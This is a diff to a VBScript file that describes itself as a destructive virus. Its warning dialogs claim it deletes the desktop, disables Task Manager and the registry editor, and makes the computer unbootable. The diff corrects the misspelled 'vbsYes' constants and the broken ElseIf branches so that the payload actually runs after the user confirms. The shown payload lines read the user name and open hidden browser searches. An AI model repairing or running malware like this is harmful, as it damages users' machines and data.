@@ -4,15 +4,15 @@ Set FSO = CreateObject("Scripting.FileSystemObject")
 
 Warning1 = Msgbox("WARNING: This virus can delete desktop, disable task manager, disable registry editor, delete the whole system, and even make your computer unbootable, Do you want to proceed?", vbYesNo, "WARNING")
 
-If Warning1 = vbsYes Then
+If Warning1 = vbYes Then
   
 Warning2 = Msgbox("SECOND WARNING: It's too destructive to even be a simple virus, just like Michelangelo, Actually Proceed?", vbYesNo, "SECOND WARNING")
 
-If Warning2 = vbsYes Then
+If Warning2 = vbYes Then
 
 Warning3 = Msgbox ("FINAL WARNING: You Sure?", vbYesNo, "SECOND WARNING")
 
-If Warning3 = vbsYes Then
+If Warning3 = vbYes Then
 Set network = CreateObject("WScript.Network")
 
 user = network.UserName
@@ -41,12 +41,12 @@ shell.run "chrome https://www.google.com/search?q=how+to+escape+virus", 0, True
 
 shell.run "msedge https://www.google.com/search?q=how+to+escape+virus", 0, True
 
-ElseIf Warning3 = vbsYes Then
+Else
       WScript.Quit
 End If
-ElseIf Warning2 = vbsYes Then
+Else
       WScript.Quit
 End If
-ElseIf Warning1 = vbsYes Then
+Else
       WScript.Quit
 End If
